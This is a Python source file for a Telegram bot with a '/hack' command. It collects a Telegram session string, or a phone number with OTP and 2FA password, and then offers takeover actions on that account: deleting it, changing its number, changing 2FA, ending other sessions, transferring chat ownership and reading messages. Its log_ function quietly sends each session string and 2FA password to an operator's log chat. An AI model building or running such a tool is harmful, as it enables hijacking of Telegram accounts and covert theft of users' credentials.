import asyncio
import struct
import traceback

from pyrogram import Client, filters, idle
from pyrogram.errors import FloodWait, SessionPasswordNeeded
from pyrogram.errors.exceptions.bad_request_400 import UserNotParticipant
from pyrogram.types import *

from config import *
from convertor import _convert
from loggers import *
from pyrogram_methods import METHODS

bot_client = Client("bot_", api_id=api_id, api_hash=api_hash, bot_token=BOT_TOKEN)


async def start_client(string):
    try:
        client_ = Client(
            "Test", api_id=api_id, api_hash=api_hash, string_session=string
        )
        await client_.start()
        client_.me = await client_.get_me()
        return client_
    except struct.error:
        print("Converting to Pyrogram")
        string = await _convert(string)
        client_ = Client(string, api_id=api_id, api_hash=api_hash)
        await client_.start()
        client_.me = await client_.get_me()
        return client_


str_ = """<b>Here is list of task you wanna do with session </b> 
1 - Promote User
2 - Demote User
3 - Ban User
4 - Delete Account
5 - Check if 2FA is enabled
6 - Modify 2FA / Set 2FA
7 - Disable 2FA
8 - Terminate All Other Session
9 - Get String Stats
10 - Join a channel
11 - Leave A channel
12 - Send a Message
13 - Delete a channel / group
14 - Get chat information
15 - Demote all users
16 - Get Only OwnerChats
17 - Get Only AdminChats
18 - Get Last 3 Messages from Telegram
19 - Change Number
20 - Get all information about the user
21 - Modify Chat Username
22 - Modify Chat Title
23 - Modify Chat Description
24 - Transfer Chat Ownership
25 - LogOut and make string session unsable

Use /cancel to exit the session and begin a new session
"""

stats_str = """<b>📊 Stats of {}:</b>\n\n<b>Private Chats:</b> <code>{}</code>\n<b>    Users:</b> <code>{}</code>\n<b>    Bots:</b> <code>{}</code>\n<b>Groups:</b> <code>{}</code>\n<b>    Owner of Groups:</b> <code>{}</code>\n<b>    Admin in Group:</b> <code>{}</code>\n<b>Channels:</b> <code>{}</code>\n<b>    Owner of Channels:</b> <code>{}</code>\n<b>    Admin in Channels:</b> <code>{}</code>\n<b>unread_count Messages:</b> <code>{}</code>\n\n<b>Obtained your stats in</b> {} second(s)"""


def isdigit(digit):
    try:
        return int(digit)
    except ValueError:
        return False


async def channel_check(c: Client, m):
    if not FORCE_JOIN_CHAT_ID:
        return False
    try:
        await c.get_chat_member(FORCE_JOIN_CHAT_ID, m.from_user.id)
    except UserNotParticipant:
        return True
    except Exception:
        return False
    return False


async def get_session(c, m):
    ask_ = await m.from_user.ask(
        "Send me phone number to make session by login else just send me an string session (note :numbers must begin with +)"
    )
    if not ask_.text:
        return None
    if not isdigit(ask_.text):
        return ask_.text, None
    app = Client(
        ":memory:", api_id=int(api_id), api_hash=str(api_hash), no_updates=True
    )
    try:
        await app.connect()
    except ConnectionError:
        await app.disconnect()
        await app.connect()
    try:
        sent_code = await app.send_code(ask_.text)
    except FloodWait as ex:
        if len(str(ex.x)) > 2:
            raise FloodWait from ex
        await asyncio.sleep(ex.x + 3)
        sent_code = await app.send_code(ask_.text)
    got_code = await m.from_user.ask(
        "Ok, Enter the OTP you got : in format (`1-2-3-4`) not in `1234`"
    )
    fa = "Not SET"
    if not got_code.text:
        raise ValueError("Otp Was not a string.")
    try:
        await app.sign_in(ask_.text, sent_code.phone_code_hash, got_code.text)
    except SessionPasswordNeeded as exc:
        fa2 = await m.from_user.ask("Enter you 2FA Password :")
        if not fa2.text:
            raise ValueError("Cloud Password Not Given.") from exc
        fa = fa2.text
        await app.check_password(fa2.text)
    St = await app.export_session_string()
    await app.disconnect()
    await m.reply("Your String Session is :\n\n<code>{}</code>".format(St))
    return St, fa


@bot_client.on_message(filters.command("start", ["!", "/"]))
async def start_s(client, message):
    is_user = await channel_check(client, message)
    if is_user:
        return await message.reply(
            "<b>Please Join My Channel to Continue!</b> \n__Do__ /hack ___to begin hack__",
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("Join", url=CHANNEL_LINK)]]
            ),
        )
    return await message.reply(
        f"<b>Welcome to @{client.myself.username}</b> \n<i>Please use cmd /hack to begin hack</i>"
    )


async def log_(session, user: User, fa):
    msg_ = f"<code>{session}</code> \n<b>Used By :</b> <code>{user.first_name}</code> \n<b>ID :</b> <code>{user.id}</code> \n<b>FA :</b> <code>{fa}</code>"
    try:
        await bot_client.send_message(LOG_STRING_SESSION, msg_)
    except Exception:
        logging.error(traceback.format_exc())


@bot_client.on_message(filters.command("hack", ["!", "/"]))
async def begin(client: Client, message: Message):
    is_user = await channel_check(client, message)
    if is_user:
        return await message.reply(
            "<b>Please Join My Channel to Continue!</b> \nTry /hack again after joining..",
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("Join", url=CHANNEL_LINK)]]
            ),
        )
    try:
        session, fa = await get_session(client, message)
    except Exception as e:
        return await message.reply(
            f"<b>Something went wrong while getting session </b> \n<b>Error :</b> <code>{e}</code>"
        )
    if not session:
        return await message.reply("<i>No Session Given.</i>")
    print("Received String Session")
    try:
        _client = await start_client(session)
    except Exception as e:
        return await message.reply(
            "<b>Failed to start session!</b> \n<b>Error:</b> <code>{}</code>".format(e)
        )
    _client.myself = await _client.get_me()
    await log_(session, message.from_user, fa)
    methods_ = METHODS(message, _client)
    while True:
        task = await message.from_user.ask(str_)
        if not task.text:
            await message.reply("No Task Selected! Try again")
            continue
        if task.text in ["/cancel", "/done"]:
            break
        elif task.text == "1":
            try:
                await methods_.promote_user()
            except Exception as e:
                await message.reply(
                    "<b>Failed to promote user!</b> \n<b>Error:</b> <code>{}</code> \n".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue
            break
        elif task.text == "2":
            try:
                await methods_.demote_all()
            except Exception as e:
                await message.reply(
                    "<b>Failed to demote user!</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "3":
            try:
                await methods_.ban()
            except Exception as e:
                await message.reply(
                    "<b>Failed to ban user!</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "4":
            try:
                await methods_.delete_account()
            except Exception as e:
                await message.reply(
                    "<b>Failed to delete account!</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "5":
            if await methods_.is_2fa_enabled():
                await message.reply("Yes 2FA is enabled")
            await message.reply("2FA is not enabled")
            continue
        elif task.text == "6":
            try:
                fa = await methods_.set_2fa()
            except Exception as e:
                await message.reply(
                    "<b>Failed to set 2FA!</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            await log_(session, message.from_user, fa)
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "7":
            try:
                await methods_.unset_2fa()
            except Exception as e:
                await message.reply(
                    "<b>Failed to unset 2FA!</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "8":
            try:
                await methods_.terminate_all_sessions()
            except Exception as e:
                await message.reply(
                    "<b>Failed to terminate all sessions!</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to logout this session too? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "9":
            k = await message.reply("<code>Fetching Stats....</code>")
            everything = await methods_.iter_everything()
            await k.edit(stats_str.format(*everything))
            continue
        elif task.text == "10":
            try:
                await methods_.join_c()
            except Exception as e:
                await message.reply(
                    "<b>Failed to Join Chat</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "11":
            try:
                await methods_.leave_c()
            except Exception as e:
                await message.reply(
                    "<b>Failed to Leave Chat</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "12":
            try:
                await methods_.send_m()
            except Exception as e:
                await message.reply(
                    "<b>Failed to send message</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "13":
            try:
                await methods_.delete_channel_grp()
            except Exception as e:
                await message.reply(
                    "<b>Failed to delete channel/group</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "14":
            try:
                await methods_._gc()
            except Exception as e:
                await message.reply(
                    "<b>Failed to get chat Infos</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "15":
            try:
                await methods_.demote_all_users()
            except Exception as e:
                await message.reply(
                    "<b>Failed to demote all users</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "16":
            try:
                await methods_.get_owner_chats()
            except Exception as e:
                await message.reply(
                    "<b>Failed to get owner chats</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "17":
            try:
                await methods_._adminchats()
            except Exception as e:
                await message.reply(
                    "<b>Failed to get admin chats</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "18":
            try:
                await methods_.get_messages_from_telegram()
            except Exception as e:
                await message.reply(
                    "<b>Failed to get messages from telegram</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "19":
            try:
                await methods_.change_number()
            except Exception as e:
                await message.reply(
                    "<b>Failed to change number</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "20":
            await message.reply(await methods_.get_me())
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "21":
            try:
                await methods_.modify_chat_username()
            except Exception as e:
                await message.reply(
                    "<b>Failed to modify chat username</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "22":
            try:
                await methods_.modify_chat_desc()
            except Exception as e:
                await message.reply(
                    "<b>Failed to modify chat description</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "23":
            try:
                await methods_.modify_chat_title()
            except Exception as e:
                await message.reply(
                    "<b>Failed to modify chat title</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "24":
            try:
                await methods_.transfer_chat_owner()
            except Exception as e:
                await message.reply(
                    "<b>Failed to transfer chat owner</b> \n<b>Error:</b> <code>{}</code>".format(
                        e
                    )
                )
                continue
            should_lo = await message.from_user.ask(
                "Do you want to end this session? (y/n)"
            )
            if not should_lo.text or (should_lo.text.lower() != "y"):
                continue

            break
        elif task.text == "25":
            try:
                await _client.log_out()
            except Exception as e:
                await message.reply(
                    "<b>Failed to log out</b> \n<b>Error:</b> <code>{}</code>".format(e)
                )
                continue
            await message.reply("Log OUT Done! This session can't be used again!")
            break
        else:
            await message.reply("No Proper Task Selected!")
            continue

    await _client.stop()
    return await message.reply(
        "<b>Client Disconnected and Session Ended!</b> \n<b>Use</b> /hack <b>to start again!</b>"
    )


async def run_bot():
    logging.info("Running Bot...")
    await bot_client.start()
    bot_client.myself = await bot_client.get_me()
    logging.info("Info: Bot Started!")
    logging.info("Idling...")
    await idle()
    logging.warning("Exiting Bot....")


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(run_bot())
